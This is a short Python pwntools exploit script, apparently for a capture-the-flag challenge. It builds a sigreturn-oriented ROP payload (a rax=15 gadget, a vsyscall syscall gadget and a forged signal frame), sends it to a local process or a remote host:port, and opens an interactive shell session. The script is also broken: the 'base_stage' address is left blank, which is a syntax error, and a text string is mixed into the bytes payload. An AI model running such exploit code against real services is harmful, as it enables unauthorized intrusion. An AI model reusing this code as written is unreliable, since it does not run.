import sys
import logging
from pwn import *

logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)


if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")
    
else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

    ###address###
syscall_ret = 0xffffffffff600007
pop_rax_ret = 0x40018a

stack_size = 0x21000
base_stage = 

    ###main###
def main():
    logging.info("main!!")
    
    ###payload###
    payload = b"a" * 40
    payload += p64(pop_rax_ret)
    payload += p64(15)
    payload += p64(syscall_ret)

    payload += b"aaaaaaaa" * 5
    payload += p64(0) * 8
    payload += p64(0)
    payload += p64(base_stage)
    payload += p64(0)
    payload += p64(0)
    payload += p64(306)
    payload += p64(0)
    payload += p64(0)
    payload += p64(base_stage)
    payload += p64(syscall_ret)
    payload += p64(0)
    payload += p64(0x33)
    payload += "aaaaaaaa" * 4
    payload += p64(0)
    
    
    
    
    #_ = target.recvuntil("")
    target.sendline(payload)
    ret = target.recvuntil("")
    
    
    target.interactive()

if __name__ == "__main__":
    main()


            
